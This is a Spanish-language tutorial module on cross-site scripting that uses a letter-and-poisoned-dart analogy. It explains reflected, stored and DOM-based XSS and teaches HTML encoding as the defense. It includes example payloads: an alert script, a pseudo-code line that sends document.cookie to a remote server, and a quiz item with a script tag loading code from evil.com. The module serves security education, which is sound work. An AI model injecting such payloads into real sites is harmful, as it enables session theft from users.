---
title: "XSS (Cross-Site Scripting): El Parásito del Navegador"
---
# XSS (Cross-Site Scripting): El Parásito del Navegador

## Objetivo del Módulo

Entender por qué el navegador del usuario (Chrome, Safari) es el eslabón más débil de la cadena, y cómo un atacante puede ejecutar código malicioso en tu computadora sin enviarte ningún archivo virus `.exe`.

A diferencia de la Inyección SQL, donde el atacante destruye el servidor trasero (El Cocinero), en **XSS (Cross-Site Scripting)** al hacker no le importa el servidor. El hacker usa la página web legítima como un simple vehículo para atacar directamente al cliente (La Mesa).

---

## 1. La Analogía: El Dardo Envenenado en la Carta

Imagina que el Servidor (Backend) es un cartero. Su único trabajo es tomar cartas (comentarios, mensajes, perfiles) de un usuario y entregárselas a otro usuario. El cartero es un robot eficiente: no lee las cartas, solo las entrega.

1. El Atacante escribe una carta (un comentario en un blog). Pero adentro de la carta, pega con cinta adhesiva un **Dardo Envenenado** con un resorte. Se la da al cartero.
2. El cartero toma la carta y la guarda en la base de datos de comentarios.
3. Al día siguiente, la **Víctima** entra a leer el blog.
4. El cartero (Servidor) le entrega la carta a la Víctima.
5. La Víctima (El navegador Chrome) abre la carta. ¡PUM! El resorte salta, el dardo envenenado se le clava en la cara a la víctima. 

**¿De quién es la culpa?** 
Del cartero (El Servidor / Programador), por no haber revisado la carta (Filtrar / Sanitizar) y quitarle las armas antes de entregársela al siguiente usuario.

---

## 2. El Código (El Dardo de JavaScript)

El "Dardo Envenenado" en la vida real es un pedazo de código escrito en **JavaScript**.
Los navegadores están programados para obedecer ciegamente cualquier cosa que esté encerrada entre las etiquetas `<script>` y `</script>`.

Si el foro de tu escuela te pregunta: *"¿Cuál es tu nombre?"*, un usuario normal escribe `Juan`.
Un Hacker escribe:
`<script> alert("Felicidades, te ganaste un iPhone"); </script>`

Si el programador fue perezoso y guardó ese texto crudo en la base de datos, cada vez que alguien visite el perfil del hacker, el navegador de la víctima no verá la palabra "script", simplemente ejecutará la orden y le sacará una ventana molesta de un iPhone falso.

### Más allá de la Molestia (Robo de Sesión)
Sacar ventanas emergentes (`alert`) es divertido, pero un hacker real hace esto de forma invisible:
`<script> enviar_a_rusia( document.cookie ); </script>`

Ese pequeño comando toma tu **Cookie de Sesión** (El post-it mágico que le dice al servidor quién eres) y se la envía al servidor remoto del hacker. El atacante ahora es dueño de tu cuenta de Facebook o de tu Banco, y tú nunca te diste cuenta porque la página pareció cargar normalmente.

---

## 3. Tipos de XSS

1.  **XSS Reflejado (El Espejo):** El código malicioso va escondido en un Link que el hacker te envía por WhatsApp. Cuando das clic, la página del banco se abre, el servidor del banco "refleja" el ataque de vuelta a tu pantalla, y te roban. El código malicioso nunca se guardó en la base de datos.
2.  **XSS Almacenado (La Bomba de Tiempo):** El peor de todos (El ejemplo de la carta). El hacker guarda el comentario malicioso en la base de datos del servidor (ej. Un video de YouTube). Un millón de personas entran a ver el video, y el millón de personas se infectan automáticamente.
3.  **XSS Basado en DOM:** El ataque ocurre enteramente dentro del código Frontend de tu navegador. El cartero (Servidor) nunca llegó a ver el dardo.

---

## 4. La Defensa (El Blue Team)

Prevenir el XSS es una de las tareas más repetitivas de un programador.

**La Regla de Oro: Sanitización y Codificación (Encoding).**

Cuando el cartero revisa la carta, debe confiscar las armas. En la web, las armas son los símbolos mayor que y menor que (`<` y `>`).
El programador usa funciones que convierten los símbolos peligrosos en texto inofensivo de HTML.
*   El `<` se convierte en `&lt;` (Less Than).
*   El `>` se convierte en `&gt;` (Greater Than).

Cuando el hacker intenta inyectar `<script>`, la base de datos guarda `&lt;script&gt;`.
Cuando el navegador de la víctima lee la página, en lugar de *ejecutar* un virus, simplemente dibuja las letras "<script>" en la pantalla como si fuera texto normal y aburrido. El dardo fue desactivado.

> **Importante:**
> Los frameworks modernos de Frontend (React, Angular, Vue) **te protegen del XSS de forma automática**. Sanitizan todo el texto por defecto. Por eso, si ves un ataque de XSS exitoso hoy en día, casi siempre es en páginas viejas, mal diseñadas, o donde el programador usó la función altamente prohibida `dangerouslySetInnerHTML`.

---

## 5. Criterio de Dominio (Autoevaluación)

Revisa si puedes detectar el veneno:

1. ¿Por qué en un ataque de Inyección SQL la víctima es el Servidor de la empresa, mientras que en un ataque de XSS la víctima es el Cliente (el usuario de la página)?
2. Encuentras un XSS Reflejado en la página de un Banco. Le mandas el link malicioso a una víctima por correo. ¿Qué archivo temporal crítico de su navegador web estás intentando robar mediante tu código de JavaScript?
3. Como Analista de SOC, ves que un usuario llamado "Pepe" subió una foto de perfil, pero en lugar del nombre de su foto, escribió `<script src="http://evil.com/virus.js"></script>`. ¿Qué tipo exacto de XSS está intentando ejecutar si su objetivo es infectar a todos los que visiten su perfil mañana?
4. El desarrollador Frontend te dice: *"No te preocupes por el XSS, yo escribí un código que bloquea la palabra específica `<script>`"*. ¿Por qué esto es una defensa inútil? *(Pista: Piensa en otras etiquetas HTML que pueden cargar imágenes o enlaces y ejecutar eventos de error).*
